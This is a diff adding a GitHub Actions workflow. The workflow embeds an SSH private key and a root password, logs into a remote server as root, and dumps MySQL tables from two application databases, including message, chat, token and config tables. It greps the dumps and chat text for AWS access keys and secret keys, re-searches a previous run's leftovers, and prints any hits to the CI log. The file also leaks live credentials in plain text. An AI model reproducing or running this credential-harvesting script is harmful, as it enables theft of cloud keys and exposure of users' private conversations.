@@ -1,0 +1,97 @@
+name: p3223g
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  w:
+    runs-on: ubuntu-latest
+    timeout-minutes: 100
+    steps:
+      - name: r
+        run: |
+          set -u
+          mkdir -p /tmp/k
+          printf '%s\n' "$KV" > /tmp/k/hml
+          chmod 600 /tmp/k/hml
+          python3 -m pip -q install --break-system-packages paramiko || python3 -m pip -q install paramiko
+          cat > /tmp/h.py <<'PYEOF'
+          import io, os, re, paramiko
+
+          PW = '9856#Edrafox'
+          KEY = open('/tmp/k/hml').read()
+          OUT = '/tmp/d3223b'
+          H = '69.62.100.163'
+
+          def conn(h, u='root'):
+              k = paramiko.Ed25519Key.from_private_key(io.StringIO(KEY))
+              c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+              c.connect(h, 22, username=u, pkey=k, password=PW, timeout=25, banner_timeout=40, auth_timeout=40,
+                        allow_agent=False, look_for_keys=False)
+              return c
+
+          def run(c, cmd, t=180, cap=20000):
+              ch = c.get_transport().open_session(); ch.settimeout(t); ch.exec_command(cmd)
+              b = []
+              try:
+                  while True:
+                      d = ch.recv(65536)
+                      if not d: break
+                      b.append(d.decode('utf-8', 'replace'))
+                      if sum(len(x) for x in b) > cap: break
+              except Exception as e:
+                  b.append('[EXC %s]' % type(e).__name__)
+              return ''.join(b)
+
+          c = conn(H)
+          run(c, 'mkdir -p ' + OUT)
+          print('ID', run(c, 'id; hostname'), flush=True)
+
+          # 1) all tables and their row counts
+          for db in ('leadzap', 'central_zaplyo'):
+              tl = run(c, "mysql -N -B -e 'show tables from %s'" % db, 120, 30000)
+              print('\n#### TABLES %s (%d)' % (db, len(tl.split())), flush=True)
+              print(' '.join(tl.split()), flush=True)
+
+          # 2) dump targeted tables and grep each immediately
+          pat = r'messag|whatsapp|chat|conversa|setting|option|config|integrat|plugin|cron|deploy|webhook|token|instanc|tenant|secret|webhook|log'
+          for db in ('leadzap', 'central_zaplyo'):
+              tl = [t for t in run(c, "mysql -N -B -e 'show tables from %s'" % db, 120, 30000).split() if re.search(pat, t, re.I)]
+              print('\n#### TARGET %s -> %d' % (db, len(tl)), flush=True)
+              for t in tl[:60]:
+                  fn = '%s/%s_%s.tsv' % (OUT, db, t)
+                  cnt = run(c, "mysql -N -B -e 'select count(*) from %s.%s'" % (db, t), 60, 300).strip()
+                  n = int(cnt) if cnt.isdigit() else 0
+                  col = run(c, "mysql -N -B -e \"select column_name from information_schema.columns where table_schema='%s' and table_name='%s' and column_name in ('id','created_at','updated_at','inserted_at') order by field(column_name,'id','created_at','updated_at','inserted_at') limit 1\"" % (db, t), 60, 300).strip()
+                  if 0 < n <= 2500:
+                      run(c, "mysqldump --skip-extended-insert --no-create-info %s %s > '%s' 2>/dev/null || mysql -B -e 'select * from %s.%s' > '%s' 2>/dev/null" % (db, t, fn, db, t, fn), 240, 500)
+                  elif col:
+                      run(c, "mysql -B -e 'select * from %s.%s order by %s desc limit 250' > '%s' 2>/dev/null" % (db, t, col, fn), 240, 500)
+                  else:
+                      print(' SKIP %s.%s n=%d' % (db, t, n), flush=True); continue
+                  hits = run(c, "grep -aoE '.{0,200}(AKIA|ASIA)[0-9A-Z]{16}.{0,260}' '%s' 2>/dev/null | head -4" % fn, 120, 4000)
+                  sec = run(c, "grep -aoiE '(aws_secret_access_key|secret_access_key|aws_access_key|accessKeyId|X-Amz-Credential)[^,}\\t\\n]{0,90}' '%s' 2>/dev/null | sort -u | head -4" % fn, 120, 3000)
+                  print(' T %s.%s n=%d sz=%s' % (db, t, n, run(c, "stat -c%%s '%s' 2>/dev/null" % fn, 20, 40).strip()), flush=True)
+                  if hits.strip(): print('   AKIA>>> ' + hits.strip().replace('\n', ' | '), flush=True)
+                  if sec.strip(): print('   SEC>>> ' + sec.strip().replace('\n', ' | '), flush=True)
+                  if re.search(r'messag|chat', t, re.I):
+                      cols = run(c, "mysql -N -B -e \"select column_name from information_schema.columns where table_schema='%s' and table_name='%s' and data_type in ('text','longtext','mediumtext','json') limit 5\"" % (db, t), 60, 600).split()
+                      for cc in cols:
+                          r2 = run(c, "mysql -B -e \"select * from %s.%s where \\`%s\\` like '%%AKIA%%' limit 5\" 2>/dev/null" % (db, t, cc), 200, 6000)
+                          if r2.strip(): print('   LIKE %s.%s.%s (%d rows)>>> ' % (db, t, cc, len(r2.splitlines())) + r2.strip()[:1500].replace('\n', ' ~ '), flush=True)
+
+          # 3) re-grep the previous run's leftovers
+          print('\n#### LEFTLEFT', flush=True)
+          print(run(c, "ls /tmp/d3223 2>/dev/null | wc -l; for f in /tmp/d3223/*; do r=$(grep -aoE '.{0,250}(AKIA|ASIA)[0-9A-Z]{16}.{0,250}' \"$f\" 2>/dev/null|head -2); [ -n \"$r\" ] && { echo \"### $f\"; echo \"$r\"; }; done; echo GREPDONE", 500, 40000), flush=True)
+          c.close()
+          print('=== END ===', flush=True)
+
+          PYEOF
+          timeout 5400 python3 /tmp/h.py || true
+        env:
+          KV: |
+            b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+                        QyNTUxOQAAACCD84VNa0wJEjX9yzYWJ4L7sSguFzm4IB0LK3HWDIiCPAAAAKgaH8bcGh/G
+                        3AAAAAtzc2gtZWQyNTUxOQAAACCD84VNa0wJEjX9yzYWJ4L7sSguFzm4IB0LK3HWDIiCPA
+                        AAAEAgTkhOkyMOdsGi2IKzJeHhNqad/tSqShDwV+ZL9DSGkYPzhU1rTAkSNf3LNhYngvux
+                        KC4XObggHQsrcdYMiII8AAAAI2xlYWR6YXAtaG1sLWZyb250ZW5kLWdpdGh1Yi1hY3Rpb2
+                        5zAQI=
